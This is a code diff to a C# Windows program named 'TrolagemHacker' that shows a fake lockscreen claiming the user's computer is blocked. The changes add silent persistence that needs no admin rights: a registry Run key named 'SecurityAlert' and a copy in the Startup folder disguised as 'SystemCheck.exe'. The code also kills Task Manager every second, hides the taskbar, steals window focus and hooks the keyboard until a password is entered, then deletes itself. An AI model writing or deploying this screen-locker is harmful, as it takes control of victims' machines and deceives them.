@@ -22,7 +22,7 @@ public class TrolagemHacker : Form
     private const string URL_HACKER = "https://i.ibb.co/NgkJFxH8/ASA.png";
     private const string URL_QRCODE = "https://raw.githubusercontent.com/espertin/wind/main/QR.png";
 
-    // --- API DO WINDOWS PARA CONTROLE DE JANELAS ---
+    // --- API DO WINDOWS ---
     [DllImport("user32.dll")]
     private static extern int FindWindow(string className, string windowText);
     [DllImport("user32.dll")]
@@ -99,7 +99,7 @@ public class TrolagemHacker : Form
         Label lblTexto = new Label();
         lblTexto.Text = "Ola, irmao. Seu computador foi bloqueado!\n\n" +
                         "AVISO: NAO TENTE REINICIAR OU FECHAR ESTA JANELA.\n" +
-                        "O FOCO E A BARRA FORAM ESTABILIZADOS.";
+                        "SISTEMA SILENCIOSO ATIVADO.";
         lblTexto.ForeColor = Color.Lime;
         lblTexto.Font = new Font("Courier New", 12, FontStyle.Bold);
         lblTexto.TextAlign = ContentAlignment.MiddleCenter;
@@ -149,15 +149,20 @@ public class TrolagemHacker : Form
             } catch {}
         }
 
-        // --- PERSISTÊNCIA ---
+        // --- PERSISTÊNCIA SILENCIOSA (SEM ADMIN) ---
         try {
             string exePath = Application.ExecutablePath;
+            // 1. Registro (Run) - HKEY_CURRENT_USER (Nao pede admin)
             RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             rk.SetValue("SecurityAlert", exePath);
-            Process.Start(new ProcessStartInfo("schtasks.exe", "/create /sc onlogon /tn \"SystemCheck\" /tr \"" + exePath + "\" /f /rl highest") { WindowStyle = ProcessWindowStyle.Hidden });
+
+            // 2. Pasta Inicializacao (Startup) - Usuario Atual
+            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            string startupPath = Path.Combine(startupFolder, "SystemCheck.exe");
+            if (!File.Exists(startupPath)) File.Copy(exePath, startupPath, true);
         } catch {}
 
-        // --- OCULTAR BARRA DE TAREFAS (MODO ESTÁVEL) ---
+        // --- OCULTAR BARRA DE TAREFAS ---
         ControlarBarraTarefas(false);
 
         // --- PROTEÇÃO ---
@@ -165,7 +170,6 @@ public class TrolagemHacker : Form
         timerProtecao.Interval = 1000;
         timerProtecao.Tick += (s, e) => {
             foreach (var p in Process.GetProcessesByName("taskmgr")) try { p.Kill(); } catch {}
-            // Não matamos mais o explorer em loop para evitar o piscar
             if (GetForegroundWindow() != this.Handle) {
                 SetForegroundWindow(this.Handle);
                 txtChave.Focus();
@@ -179,10 +183,8 @@ public class TrolagemHacker : Form
 
     private void ControlarBarraTarefas(bool mostrar) {
         int hwndBarra = FindWindow("Shell_TrayWnd", "");
-        int hwndBotao = FindWindow("Button", "Start");
         int comando = mostrar ? SW_SHOW : SW_HIDE;
         if (hwndBarra != 0) ShowWindow(hwndBarra, comando);
-        if (hwndBotao != 0) ShowWindow(hwndBotao, comando);
     }
 
     private void VerificarChave() {
@@ -192,16 +194,18 @@ public class TrolagemHacker : Form
         if (txtChave.Text == SENHA_MESTRA || (!string.IsNullOrEmpty(senhaGitHub) && txtChave.Text == senhaGitHub)) {
             UnhookWindowsHookEx(_hookID);
             timerProtecao.Stop();
-            
-            // --- RESTAURAR BARRA DE TAREFAS ---
             ControlarBarraTarefas(true);
             
             try {
+                // Remove do registro e startup
                 Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("SecurityAlert", false);
-                Process.Start(new ProcessStartInfo("schtasks.exe", "/delete /tn \"SystemCheck\" /f") { WindowStyle = ProcessWindowStyle.Hidden });
-                
+                string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SystemCheck.exe");
+                if (File.Exists(startupPath)) File.Delete(startupPath);
+
+                // Autodestruicao
+                string exePath = Application.ExecutablePath;
                 string batPath = Path.Combine(Path.GetTempPath(), "cleanup.bat");
-                File.WriteAllText(batPath, "@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q \"" + Application.ExecutablePath + "\"\ndel /f /q \"%~f0\"\nexit");
+                File.WriteAllText(batPath, "@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q \"" + exePath + "\"\ndel /f /q \"%~f0\"\nexit");
                 Process.Start(new ProcessStartInfo("cmd.exe", "/c \"" + batPath + "\"") { WindowStyle = ProcessWindowStyle.Hidden });
             } catch {}
 
